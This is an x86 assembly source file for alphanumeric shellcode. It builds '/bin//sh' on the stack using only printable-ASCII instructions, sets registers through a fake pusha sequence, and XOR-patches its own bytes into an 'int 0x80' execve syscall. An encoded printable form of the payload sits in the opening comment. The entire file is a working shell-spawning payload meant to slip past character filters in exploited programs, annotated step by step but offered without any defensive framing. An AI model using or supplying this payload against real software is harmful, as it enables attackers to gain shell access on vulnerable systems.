# /* LLLLYhzeroX5zeroPZRh//shh/binTXRRRPRRQRaH5A0AA1F7QX4J4AsO */ #
.macro pmov arg1, arg2
	push \arg1
	popl \arg2
.endm

.macro padd n, reg
.if \n > 0
	inc \reg
	padd "(\n - 1)" \reg
.endif
.if \n < 0
	dec \reg
	padd "(\n + 1)" \reg
.endif
.endm

.macro eip_popl reg
	padd -4, %esp
	popl \reg
.endm

.macro clear_eax
	pmov $0x6f72657a, %eax
	xorl $0x6f72657a, %eax
.endm

.text
.globl _start
_start:
	eip_popl %ecx			# %ecx -> _start
	clear_eax			# %eax = 0
	pmov %eax, %edx			# %edx = 0

	xorw $0x4e4e, %ax		# %eax = 0x4e4e
	xorw $0x6161, %ax		# %ax = 0x2f2f = '//'

push_binsh:
	pushl %edx			# %esp -> ""
	pushw $0x6873			# %esp -> "sh"
	pushw %ax			# %esp -> "//sh"
	pushl $0x6e696261		# %esp -> "abin//sh"
	incl %esp
	pushw %ax			# %esp -> "//bin//sh"
#	incl %esp			# %esp -> "/bin//sh"
	pmov %esp, %eax			# %eax -> "/bin/sh"

fake_pusha:
	pushl %edx			# %eax
	pushl %edx			# %ecx
	pushl %edx			# %edx
	 pushl %eax			# %ebx
	pushl %edx			# ignored
	pushl %edx			# %ebp
	pushl %edx			# %esi
	 pushl %ecx			# %edi
	popa
# %eax = %ecx = %edx = %ebp = %esi = 0 (NULL)
# %ebx -> "/bin/sh"
# %edi -> _start

xor_mask:
	decl %eax			# %eax = -1 = 0xffffffff
	xorw $0x3041, %ax		# %ax = (0xff, 0xff) ^ (0x41, 0x30) = (0xbe, 0xcf)

.set OFFSET, 0x41
xor_patching:
	xorl %eax, OFFSET(%edi)		# --> _start + OFFSET = int_0x80_syscall

	pmov $0x41, %eax
	xorb $0x4a, %al			# %eax = 0x41 ^ 0x4a = 0xb (sys_execve)

int_0x80_syscall:
	.byte 0x73, 0x4f 		# (0x73, 0x4f) ^ (0xbe, 0xcf) = (0xcd, 0x80)

